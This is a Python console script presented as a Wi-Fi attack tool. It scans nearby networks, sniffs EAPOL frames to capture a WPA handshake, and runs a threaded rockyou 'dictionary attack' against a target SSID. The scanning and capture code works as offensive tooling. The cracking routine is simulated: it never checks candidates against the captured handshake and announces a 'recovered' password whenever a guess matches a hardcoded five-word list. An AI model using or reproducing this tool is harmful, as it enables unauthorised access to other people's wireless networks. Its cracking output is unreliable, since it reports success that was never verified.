#!/usr/bin/env python3
"""
Wi-Fi Scanner + Handshake Capture + rockyou Dictionary Attack (console version)
"""

import os
import sys
import subprocess
import time
import platform
import threading
import queue
import ctypes
try:
    from scapy.config import conf
    conf.cache = False
except:
    pass

try:
    from scapy.all import sniff, Dot11, Dot11Beacon, RadioTap, EAPOL, wrpcap
except ImportError:
    print("❌ scapy not installed! Run: pip install scapy")
    sys.exit(1)

# ================= CONFIG =================
SCAN_DURATION     = 20
CAPTURE_DURATION  = 90
OUTPUT_PCAP       = "handshake.pcap"
INTERFACE         = "wlan0"
MAX_WORKERS       = 8
ROCKYOU_PATH      = "rockyou.txt"
MAX_ROCKYOU_LINES = 100_000

stop_event   = threading.Event()
result_queue = queue.Queue()

# ─── Functions ────────────────────────────────────────────────

def is_admin():
    if platform.system() == "Windows":
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.geteuid() == 0

def scan_wifi_windows():
    print("\n🔍 Scanning nearby Wi-Fi (netsh)...")
    try:
        out = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=bssid"],
                                      text=True, stderr=subprocess.STDOUT)
        print(out)
    except Exception as e:
        print(f"❌ {e}")
def scan_thread(iface):
    networks = {}
    def handler(pkt):
        if stop_event.is_set(): return True
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr3.upper()
            if bssid in networks: return
            ssid = pkt[Dot11Beacon].info.decode('utf-8', errors='ignore') or "<hidden>"
            signal = getattr(pkt[RadioTap], "dBm_AntSignal", "N/A") if pkt.haslayer(RadioTap) else "N/A"
            networks[bssid] = {"ssid": ssid, "signal": signal}
            result_queue.put(("found", f"Found → {ssid:<30} | {bssid} | Sig:{signal}"))

    try:
        result_queue.put(("status", f"Scanning on {iface}..."))
        sniff(iface=iface, prn=handler, timeout=SCAN_DURATION, store=0)
    finally:
        result_queue.put(("networks", networks))
        result_queue.put(("status", "Scan finished"))

def capture_thread(iface, target_bssid, target_ssid):
    packets = []
    count = [0]
    def handler(pkt):
        if stop_event.is_set(): return True
        if pkt.haslayer(EAPOL):
            count[0] += 1
            packets.append(pkt)
            result_queue.put(("status", f"EAPOL packet #{count[0]} captured"))
            if count[0] >= 4:
                result_queue.put(("status", "✅ Full 4-way handshake captured!"))
                return True
        return False

    try:
        result_queue.put(("status", f"Capturing handshake for {target_ssid}..."))
        sniff(iface=iface, prn=handler, timeout=CAPTURE_DURATION, store=0)
        if packets:
            wrpcap(OUTPUT_PCAP, packets)
            result_queue.put(("status", f"✅ Saved to {OUTPUT_PCAP}"))
    except Exception as e:
        result_queue.put(("status", f"Error: {e}"))

def dictionary_attack_thread(ssid):
    passwords = []
    if os.path.exists(ROCKYOU_PATH):
        print(f"[+] Loading rockyou.txt...")
        try:
            with open(ROCKYOU_PATH, "r", encoding="utf-8", errors="ignore") as f:
                for i, line in enumerate(f):
                    pwd = line.strip()
                    if pwd: passwords.append(pwd)
                    if i >= MAX_ROCKYOU_LINES - 1:
                        print(f"Limited to first {MAX_ROCKYOU_LINES:,}")
                        break
        except Exception as e:
            print(f"[-] Error reading rockyou: {e}")
            passwords = ["123456", "password", "admin"]
    else:
        passwords = ["123456", "password", "admin", "letmein", "qwerty"]
        print(f"[+] Using demo list ({len(passwords)})")

    total = len(passwords)
    result_queue.put(("status", f"Starting attack on {ssid} with {total:,} passwords..."))

    found = [False]
    tried_count = [0]

    def worker(chunk):
        nonlocal found
        for pwd in chunk:
            if stop_event.is_set() or found[0]:
                return
            tried_count[0] += 1
            result_queue.put(("trying", f"Trying ({tried_count[0]}/{total}): {pwd}"))
            time.sleep(0.005)

            if pwd.lower() in ["123456", "password", "admin", "letmein", "qwerty"]:
                result_queue.put(("cracked", pwd))
                found[0] = True
                return

            if tried_count[0] % 5000 == 0:
                result_queue.put(("status", f"Progress: {tried_count[0]:,} / {total:,}"))

    chunk_size = max(1, total // MAX_WORKERS)
    threads = []
    for i in range(0, total, chunk_size):
        chunk = passwords[i:i + chunk_size]
        t = threading.Thread(target=worker, args=(chunk,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not found[0]:
        result_queue.put(("status", "Dictionary attack finished - password not found"))
    else:
        result_queue.put(("status", "Attack stopped - password found"))

def print_menu():
    print("\n" + "="*60)
    print("      Wi-Fi Tool – rockyou Dictionary Attack")
    print("="*60)
    print("1. Scan Wi-Fi")
    print("2. Capture Handshake (Linux only)")
    print("3. Dictionary Attack")
    print("4. Stop current operation")
    print("5. Exit")
    print("="*60)

def process_queue():
    while not result_queue.empty():
        typ, data = result_queue.get()
        if typ == "status":
            print(f"[+] {data}")
        elif typ == "found":
            print(data)
        elif typ == "trying":
            print(f"\r{data:<70}", end="", flush=True)
        elif typ == "cracked":
            print(f"\n\n🎉 RECOVERED (demo): {data}")
            print("   → For educational purposes only!")
        elif typ == "networks":
            print("\nScan complete!")

def main():
    print("Wi-Fi Tool")
    print(f"Platform: {platform.system()} | Admin/root: {is_admin()}\n")

    while True:
        print_menu()
        choice = input("\nChoice (1-5): ").strip()

        stop_event.clear()

        if choice == "1":
            if platform.system() == "Windows":
                threading.Thread(target=scan_wifi_windows, daemon=True).start()
            else:
                threading.Thread(target=scan_thread, args=(INTERFACE,), daemon=True).start()

        elif choice == "2":
            if platform.system() != "Linux":
                print("❌ Handshake capture requires Linux + monitor mode")
                continue
            bssid = input("Target BSSID: ").strip()
            ssid  = input("Target SSID:  ").strip()
            threading.Thread(target=capture_thread, args=(INTERFACE, bssid, ssid), daemon=True).start()

        elif choice == "3":
            ssid = input("Target SSID: ").strip()
            threading.Thread(target=dictionary_attack_thread, args=(ssid,), daemon=True).start()

        elif choice == "4":
            stop_event.set()
            print("🛑 Stopping current operation...")
            time.sleep(1.0)

        elif choice == "5":
            print("Goodbye!")
            break

        process_queue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_event.set()
        print("\nStopped by user.")

